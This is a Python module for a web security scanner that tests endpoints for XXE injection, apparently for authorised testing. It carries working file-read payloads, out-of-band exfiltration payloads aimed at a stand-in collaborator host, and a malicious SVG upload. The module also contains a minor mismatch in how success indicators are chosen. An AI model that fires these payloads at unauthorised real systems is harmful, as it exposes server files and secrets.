"""
XXE (XML External Entity Injection) Scanner
OWASP A4:2017 / A05:2021 - Security Misconfiguration
CWE-611: Improper Restriction of XML External Entity Reference

Tests for:
  - Classic XXE (file read via SYSTEM entity)
  - Blind XXE (out-of-band via DNS/HTTP callback)
  - XXE via SVG upload endpoints
  - XXE via SOAP endpoints
  - Parameter entity XXE
"""

import re
from .base import BaseScanner, Finding


# ── Payloads ──────────────────────────────────────────────────────────────────

CLASSIC_XXE_PAYLOADS = [
    # Linux /etc/passwd read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "file:///etc/passwd",
    ),
    # Windows system file
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
        '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        "file:///c:/windows/win.ini",
    ),
    # /etc/hosts
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
        '<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
        "file:///etc/hosts",
    ),
    # /proc/self/environ
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
        '<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        "file:///proc/self/environ",
    ),
]

OOB_XXE_PAYLOADS = [
    # OOB via HTTP — attacker's server receives DNS/HTTP call
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
        '<!ENTITY % xxe SYSTEM "http://burpcollaborator.example.com/xxe">'
        '%xxe;]><foo>test</foo>',
        "OOB HTTP callback",
    ),
    # Parameter entity for error-based exfil
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://burpcollaborator.example.com/?x=%file;\'>"> %eval; %exfil;]><foo/>',
        "Parameter entity OOB exfil",
    ),
]

SVG_XXE_PAYLOADS = [
    (
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>'
        '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
        '<text font-size="16" x="0" y="16">&xxe;</text></svg>',
        "SVG XXE",
    ),
]

SOAP_XXE_PAYLOAD = (
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY>'
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
    '<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
    "SOAP XXE",
)

# Signs that XXE was successful (file content indicators)
PASSWD_INDICATORS = ["root:x:", "root:!", "daemon:", "/bin/bash", "/bin/sh"]
WINI_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit"]


class XXEScanner(BaseScanner):
    """Scans for XML External Entity (XXE) injection vulnerabilities."""

    SCANNER_NAME = "XXE Injection"
    OWASP_CATEGORY = "A05:2021"
    CWE = "CWE-611"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting XXE scan against {self.target}")
        self._scan_xml_endpoints()
        self._scan_upload_endpoints()
        return self.findings

    def _scan_xml_endpoints(self):
        """Test endpoints that accept XML (Content-Type: application/xml)."""
        xml_endpoints = [
            self.target,
            f"{self.target}/api",
            f"{self.target}/api/v1",
            f"{self.target}/ws",
            f"{self.target}/soap",
            f"{self.target}/service",
            f"{self.target}/xmlrpc.php",
            f"{self.target}/upload",
        ]

        for endpoint in xml_endpoints:
            # First probe: does it accept XML at all?
            probe_payload = '<?xml version="1.0"?><test>ping</test>'
            resp, evidence = self.http.post(
                endpoint,
                raw_body=probe_payload,
                headers={"Content-Type": "application/xml"},
            )
            if resp is None:
                continue
            if resp.status_code not in (200, 201, 202, 400, 422, 500):
                continue

            # Now try classic XXE
            for payload, file_target in CLASSIC_XXE_PAYLOADS:
                resp2, evidence2 = self.http.post(
                    endpoint,
                    raw_body=payload,
                    headers={"Content-Type": "application/xml"},
                )
                if resp2 is None:
                    continue

                indicators = PASSWD_INDICATORS if "passwd" in file_target else WINI_INDICATORS
                if self.contains_any(resp2.text, indicators):
                    self.add_finding(Finding(
                        title="XML External Entity (XXE) Injection — File Disclosure",
                        severity="CRITICAL",
                        owasp="A05:2021",
                        cwe="CWE-611",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                        url=endpoint,
                        parameter="XML body",
                        payload=payload[:200] + "...",
                        description=(
                            f"The endpoint parses user-supplied XML and evaluates external entities. "
                            f"An attacker can read arbitrary server files (e.g., {file_target})."
                        ),
                        impact=(
                            "Full server file system read access as the web-app user. "
                            "Can lead to credential theft, source code disclosure, and RCE via SSRF chaining."
                        ),
                        remediation=(
                            "Disable external entity processing in your XML parser. "
                            "In Python: `parser = etree.XMLParser(resolve_entities=False, no_network=True)`. "
                            "Never pass user-controlled XML directly to the parser without validation."
                        ),
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            "https://cwe.mitre.org/data/definitions/611.html",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        ],
                        evidence=evidence2,
                        confirmed=True,
                        vuln_type="xxe",
                    ))
                    return  # one confirmed finding is sufficient

            # Test OOB / blind XXE (report as potential, cannot confirm without callback server)
            for payload, desc in OOB_XXE_PAYLOADS:
                resp3, evidence3 = self.http.post(
                    endpoint,
                    raw_body=payload,
                    headers={"Content-Type": "application/xml"},
                )
                if resp3 is not None and resp3.status_code != 400:
                    self.add_finding(Finding(
                        title="Potential Blind XXE (Out-of-Band) — XML Accepted",
                        severity="HIGH",
                        owasp="A05:2021",
                        cwe="CWE-611",
                        cvss_score=8.2,
                        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N",
                        url=endpoint,
                        parameter="XML body",
                        payload=payload[:200] + "...",
                        description=(
                            f"Endpoint accepts XML with external entities and does not return a 400. "
                            f"Blind OOB XXE may be possible; confirm with a Burp Collaborator callback. "
                            f"Payload type: {desc}"
                        ),
                        impact="Potential server-side file read and SSRF via out-of-band data exfiltration.",
                        remediation=(
                            "Disable external entity resolution. "
                            "Use a safe XML parsing library configuration."
                        ),
                        references=[
                            "https://portswigger.net/web-security/xxe/blind",
                        ],
                        evidence=evidence3,
                        confirmed=False,
                        vuln_type="xxe",
                    ))
                    break  # one potential OOB finding per endpoint

    def _scan_upload_endpoints(self):
        """Test SVG / file upload endpoints for XXE via file content."""
        upload_paths = ["/upload", "/api/upload", "/import", "/profile/upload"]
        svg_payload, _ = SVG_XXE_PAYLOADS[0]

        for path in upload_paths:
            url = f"{self.target}{path}"
            import io
            files = {
                "file": ("evil.svg", io.BytesIO(svg_payload.encode()), "image/svg+xml")
            }
            try:
                resp = self.http.session.post(
                    url,
                    files=files,
                    timeout=self.http.timeout,
                    verify=False,
                )
                if resp is None:
                    continue
                if resp.status_code in (200, 201, 202) and self.contains_any(resp.text, PASSWD_INDICATORS):
                    self.add_finding(Finding(
                        title="XXE via SVG Upload — File Disclosure",
                        severity="CRITICAL",
                        owasp="A05:2021",
                        cwe="CWE-611",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                        url=url,
                        parameter="file (multipart upload)",
                        payload=svg_payload[:200],
                        description="SVG file upload endpoint processes XML external entities, leaking server files.",
                        impact="Arbitrary file read from the server via uploaded SVG.",
                        remediation="Strip or sanitize SVG content before processing. Disable XXE in XML parsers.",
                        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                        confirmed=True,
                        vuln_type="xxe",
                    ))
            except Exception:
                pass
